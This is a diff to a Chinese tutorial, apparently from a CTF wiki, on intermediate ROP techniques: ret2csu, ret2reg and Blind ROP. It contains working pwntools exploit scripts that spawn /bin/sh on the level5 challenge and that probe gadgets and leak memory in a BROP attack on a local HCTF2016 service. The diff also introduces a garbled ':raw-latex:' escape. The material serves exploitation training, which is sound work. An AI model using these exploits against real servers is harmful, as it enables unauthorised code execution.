@@ -1,18 +1,17 @@
 
-
 中级ROP
 =======
 
 中级ROP主要是使用了一些比较巧妙的Gadgets。
 
-ret2__libc_scu_init
-^^^^^^^^^^^^^^^^^^^^
+ret2\_\_libc\_scu\_init
+-----------------------
 
 原理
-----
+~~~~
 
 在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。
-这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)
+这时候，我们可以利用x64下的\_\_libc\_scu\_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)
 
 .. code:: asm
 
@@ -62,13 +61,13 @@ ret2__libc_scu_init
 这里我们可以利用以下几点
 
 -  从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。
--  从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi， **但其实此时rdi的高32位寄存器值为0（自行调试）** ，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
--  从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。
+-  从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，\ **但其实此时rdi的高32位寄存器值为0（自行调试）**\ ，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
+-  从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc\_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。
 
 示例
-----
+~~~~
 
-这里我们以蒸米的一步一步学ROP之linux_x64篇中level5为例进行介绍。首先检查程序的安全保护
+这里我们以蒸米的一步一步学ROP之linux\_x64篇中level5为例进行介绍。首先检查程序的安全保护
 
 .. code:: shell
 
@@ -98,10 +97,10 @@ ret2__libc_scu_init
 
 基本利用思路如下
 
--  利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数
+-  利用栈溢出执行libc\_csu\_gadgets获取write函数地址，并使得程序重新执行main函数
 -  根据libcsearcher获取对应libc版本以及execve函数地址
--  再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。
--  再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。
+-  再次利用栈溢出执行libc\_csu\_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。
+-  再次利用栈溢出执行libc\_csu\_gadgets执行execve('/bin/sh')获取shell。
 
 exp如下
 
@@ -110,7 +109,7 @@ exp如下
     from pwn import *
     from LibcSearcher import LibcSearcher
 
-    #context.log_level = 'debug'
+    ##context.log_level = 'debug'
 
     level5 = ELF('./level5')
     sh = process('./level5')
@@ -143,8 +142,8 @@ exp如下
 
 
     sh.recvuntil('Hello, World\n')
-    # RDI, RSI, RDX, RCX, R8, R9, more on the stack
-    # write(1,write_got,8)
+    ## RDI, RSI, RDX, RCX, R8, R9, more on the stack
+    ## write(1,write_got,8)
     csu(0, 1, write_got, 8, write_got, 1, main_addr)
 
     write_addr = u64(sh.recv(8))
@@ -152,34 +151,34 @@ exp如下
     libc_base = write_addr - libc.dump('write')
     execve_addr = libc_base + libc.dump('execve')
     log.success('execve_addr ' + hex(execve_addr))
-    #gdb.attach(sh)
+    ##gdb.attach(sh)
 
-    # read(0,bss_base,16)
-    # read execve_addr and /bin/sh\x00
+    ## read(0,bss_base,16)
+    ## read execve_addr and /bin/sh\x00
     sh.recvuntil('Hello, World\n')
     csu(0, 1, read_got, 16, bss_base, 0, main_addr)
     sh.send(p64(execve_addr) + '/bin/sh\x00')
 
     sh.recvuntil('Hello, World\n')
-    # execve(bss_base+8)
+    ## execve(bss_base+8)
     csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
     sh.interactive()
 
 思考
-----
+~~~~
 
 改进
-~~~~
+^^^^
 
 在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法
 
 改进1-提前控制rbx与rbp
-&&&&&&&&&&&&&&&&&&&&&&
+''''''''''''''''''''''
 
 可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少16字节，即我们所需的字节数只需要112。
 
 改进2-多次利用
-&&&&&&&&&&&&&&&&&&&&
+''''''''''''''
 
 其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件
 
@@ -189,7 +188,7 @@ exp如下
 **当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**
 
 gadget
-~~~~~~
+^^^^^^
 
 其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数
 
@@ -208,12 +207,12 @@ gadget
 
 我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。
 
-需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器
+需要一说的是，在上面的libc\_csu\_init中我们主要利用了以下寄存器
 
 -  利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
 -  利用中间部分的代码控制了rdx，rsi，edi。
 
-而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址， **可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。** 而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。
+而其实libc\_csu\_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，\ **可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。**\ 而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。
 
 .. code:: asm
 
@@ -266,10 +265,10 @@ gadget
        0x400630 <__libc_csu_fini>:  repz ret 
 
 题目
-----
+~~~~
 
 -  2016 XDCTF pwn100
--  2016 华山杯 SU_PWN
+-  2016 华山杯 SU\_PWN
 
 参考阅读
 
@@ -277,44 +276,42 @@ gadget
 -  http://wooyun.jozxing.cc/static/drops/binary-10638.html
 
 ret2reg
-^^^^^^^^^^^^
+-------
 
 原理
-----
+~~~~
 
 1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
-2. 然后反编译二进制，查找call reg 或者jmp reg指令，将
-   EIP设置为该指令地址
+2. 然后反编译二进制，查找call reg 或者jmp reg指令，将 EIP设置为该指令地址
 3. reg所指向的空间上注入Shellcode(需要确保该空间是可以执行的，但通常都是栈上的)
 
 BROP
-^^^^^^^
+----
 
 基本介绍
---------
+~~~~~~~~
 
-BROP(Blind ROP)于2014年由Standford的Andrea
-Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是 **Hacking Blind** ，下面是作者对应的paper和slides,以及作者相应的介绍
+BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是\ **Hacking Blind**\ ，下面是作者对应的paper和slides,以及作者相应的介绍
 
--  `paper <http://www.scs.stanford.edu/brop/bittau-brop.pdf>`_
--  `slide <http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf>`_
+-  `paper <http://www.scs.stanford.edu/brop/bittau-brop.pdf>`__
+-  `slide <http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf>`__
 
 BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。
 
 攻击条件
---------
+~~~~~~~~
 
 1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
-2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,
-   MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。
+2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache,
+   OpenSSH等服务器应用都是符合这种特性的。
 
 攻击原理
---------
+~~~~~~~~
 
 目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。
 
 基本思路
-~~~~~~~~
+^^^^^^^^
 
 在BROP中，基本的遵循的思路如下
 
@@ -328,12 +325,12 @@ BROP是没有对应应用程序的源代码或者二进制文件下，对程序�
 -  利用输出函数来dump出程序以便于来找到更多的gadgets，从而可以写出最后的exploit。
 
 栈溢出长度
-~~~~~~~~~~
+^^^^^^^^^^
 
 直接从1暴力枚举即可，直到发现程序崩溃。
 
 Stack Reading
-~~~~~~~~~~~~~
+^^^^^^^^^^^^^
 
 如下所示，这是目前经典的栈布局
 
@@ -353,10 +350,10 @@ canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所�
    :alt: 
 
 Blind ROP
-~~~~~~~~~
+^^^^^^^^^
 
 基本思路
-&&&&&&&&&&&&&&&&&&&&
+''''''''
 
 最朴素的执行write函数的方法就是构造系统调用。
 
@@ -371,20 +368,20 @@ Blind ROP
 但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。
 
 BROP gadgets
-''''''''''''
+            
 
-首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的
+首先，在libc\_csu\_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的
 
 .. figure:: /pwn/stackoverflow/figure/brop_gadget.png
    :alt: 
 
 find a call write
-'''''''''''''''''
+                 
 
 我们可以通过plt表来获取write的地址。
 
 control rdx
-'''''''''''
+           
 
 需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序
 
@@ -402,7 +399,7 @@ control rdx
 -  strcmp入口
 
 寻找gadgets
-&&&&&&&&&&&&&&&&&&&&
+'''''''''''
 
 首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况
 
@@ -413,23 +410,22 @@ control rdx
 为了寻找合理的gadgets，我们可以分为以下两步
 
 寻找stop gadgets
-''''''''''''''''
+                
 
-所谓 ``stop gadget`` **一般** 指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。
+所谓\ ``stop gadget``\ 一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。
 
-    其实stop
-    gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。
+    其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。
 
 之所以要寻找stop
-gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的 ``useful gadget`` ，从而放弃它。例子如下图
+gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的\ ``useful gadget``\ ，从而放弃它。例子如下图
 
 .. figure:: /pwn/stackoverflow/figure/stop_gadget.png
    :alt: 
 
-但是，如果我们布置了 ``stop gadget`` ，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。
+但是，如果我们布置了\ ``stop gadget``\ ，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。
 
 识别 gadgets
-''''''''''''
+            
 
 那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址
 
@@ -440,10 +436,10 @@ gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其
 -  **Trap**
 -  可以导致程序崩溃的地址
 
-我们可以通过在栈上摆放不同顺序的 **Stop** 与 **Trap** 从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子
+我们可以通过在栈上摆放不同顺序的\ **Stop**\ 与 **Trap**\ 从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子
 
 -  probe,stop,traps(traps,traps,...)
--  我们通过程序崩溃与否( **如果程序在probe处直接崩溃怎么判断** )可以找到不会对栈进行pop操作的gadget，如
+-  我们通过程序崩溃与否(\ **如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如
 
    -  ret
    -  xor eax,eax; ret
@@ -456,30 +452,24 @@ gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其
 
 -  probe, trap, trap, trap, trap, trap, trap, stop, traps
 -  我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop
-   gadget相似的gadget。 **这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，** 这里一般来说会遇到两处比较有意思的地方
+   gadget相似的gadget。\ **这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**\ 这里一般来说会遇到两处比较有意思的地方
 
    -  plt处不会崩，，
-   -  _start处不会崩，相当于程序重新执行。
+   -  \_start处不会崩，相当于程序重新执行。
 
 之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。
 
 但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。
 
 但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop
-gadgets。此外，这个gadgets通过错位还可以生成
+gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。
 
--  pop rsp
+此外，根据我们之前学的ret2libc\_csu\_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。
 
-等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。
-
-**此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。**
-
-**需要注意的是probe可能是一个stop
-gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop
-gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思**
+需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.
 
 寻找PLT
-&&&&&&&&&&
+'''''''
 
 如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。
 
@@ -489,7 +479,7 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。
 
 控制rdx
-&&&&&&&&&&&&&&
+'''''''
 
 当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。
 
@@ -507,7 +497,7 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 
 只有最后一种格式，程序才会正常执行。
 
-**注** ：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。
+**注**\ ：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。
 
 那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法
 
@@ -516,15 +506,15 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 
 这样，我们就不用来回控制相应的变量了。
 
-当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。
+当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。
 
 寻找输出函数
-&&&&&&&&&&&&&&&&
+''''''''''''
 
 寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。
 
-寻找write\@plt
-'''''''''''''''
+寻找write@plt
+             
 
 当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值
 
@@ -538,20 +528,18 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 
 当然，我们也可以选择寻找puts函数。
 
-寻找puts\@plt
-''''''''''''''
+寻找puts@plt
+            
 
-寻找puts函数(这里我们寻找的是
-plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop
-gadget。那么，我们根据brop
-gadget偏移9可以得到相应的gadgets（由ret2libc\_csu\_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为 \x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下
+寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop
+gadget偏移9可以得到相应的gadgets（由ret2libc\_csu\_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下
 
 ::
 
     payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
 
 攻击总结
-~~~~~~~~
+^^^^^^^^
 
 此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情
 
@@ -560,12 +548,12 @@ gadget偏移9可以得到相应的gadgets（由ret2libc\_csu\_init中后续可�
 -  执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。
 
 例子
-----
+~~~~
 
 这里我们以HCTF2016的出题人失踪了为例，相关的部署文件都放在了example文件夹下的对应目录下。基本思路如下
 
 确定栈溢出长度
-~~~~~~~~~~~~~~
+^^^^^^^^^^^^^^
 
 .. code:: python
 
@@ -586,11 +574,10 @@ gadget偏移9可以得到相应的gadgets（由ret2libc\_csu\_init中后续可�
                 sh.close()
                 return i - 1
 
-根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack
-reading。
+根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。
 
 寻找 stop gadgets
-~~~~~~~~~~~~~~~~~~
+^^^^^^^^^^^^^^^^^
 
 寻找过程如下
 
@@ -619,11 +606,9 @@ reading。
     one success stop gadget addr: 0x4006b6
 
 识别brop gadgets
-~~~~~~~~~~~~~~~~~
+^^^^^^^^^^^^^^^^
 
-下面，我们根据上面介绍的原理来得到对应的brop
-gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop
-gadget，后面的check_brop_gadget是为了检查。
+下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get\_brop\_gadget是为了得到可能的brop gadget，后面的check\_brop\_gadget是为了检查。
 
 .. code:: python
 
@@ -660,9 +645,9 @@ gadget，后面的check_brop_gadget是为了检查。
             return True
 
 
-    #length = getbufferflow_length()
+    ##length = getbufferflow_length()
     length = 72
-    #get_stop_addr(length)
+    ##get_stop_addr(length)
     stop_gadget = 0x4006b6
     addr = 0x400740
     while 1:
@@ -676,8 +661,8 @@ gadget，后面的check_brop_gadget是为了检查。
 
 这样，我们基本得到了brop的gadgets地址0x4007ba
 
-确定puts\@plt地址
-~~~~~~~~~~~~~~~~~~
+确定puts@plt地址
+^^^^^^^^^^^^^^^^
 
 根据上面，所说我们可以构造如下payload来进行获取
 
@@ -711,8 +696,8 @@ gadget，后面的check_brop_gadget是为了检查。
 
 最后根据plt的结构，选择0x400560作为puts@plt
 
-泄露puts\@got地址
-~~~~~~~~~~~~~~~~~~
+泄露puts@got地址
+^^^^^^^^^^^^^^^^
 
 在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下
 
@@ -739,14 +724,14 @@ gadget，后面的check_brop_gadget是为了检查。
             return None
 
 
-    #length = getbufferflow_length()
+    ##length = getbufferflow_length()
     length = 72
-    #stop_gadget = get_stop_addr(length)
+    ##stop_gadget = get_stop_addr(length)
     stop_gadget = 0x4006b6
-    #brop_gadget = find_brop_gadget(length,stop_gadget)
+    ##brop_gadget = find_brop_gadget(length,stop_gadget)
     brop_gadget = 0x4007ba
     rdi_ret = brop_gadget + 9
-    #puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
+    ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
     puts_plt = 0x400560
     addr = 0x400000
     result = ""
@@ -761,10 +746,10 @@ gadget，后面的check_brop_gadget是为了检查。
     with open('code', 'wb') as f:
         f.write(result)
 
-最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了 '\x00' ，因为puts是输出字符串，字符串是以 '\x00' 为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase
+最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了':raw-latex:`\x`00'，因为puts是输出字符串，字符串是以':raw-latex:`\x`00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase
 program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下
 
-.. code:: text
+.. code:: asm
 
     seg000:0000000000400560                 db 0FFh
     seg000:0000000000400561                 db  25h ; %
@@ -787,20 +772,20 @@ program 将程序的基地址改为0x400000，然后找到偏移0x560处，如�
 这说明，puts@got的地址为0x601018。
 
 程序利用
-~~~~~~~~
+^^^^^^^^
 
 .. code:: python
 
-    #length = getbufferflow_length()
+    ##length = getbufferflow_length()
     length = 72
-    #stop_gadget = get_stop_addr(length)
+    ##stop_gadget = get_stop_addr(length)
     stop_gadget = 0x4006b6
-    #brop_gadget = find_brop_gadget(length,stop_gadget)
+    ##brop_gadget = find_brop_gadget(length,stop_gadget)
     brop_gadget = 0x4007ba
     rdi_ret = brop_gadget + 9
-    #puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
+    ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
     puts_plt = 0x400560
-    #leakfunction(length, rdi_ret, puts_plt, stop_gadget)
+    ##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
     puts_got = 0x601018
 
     sh = remote('127.0.0.1', 9999)
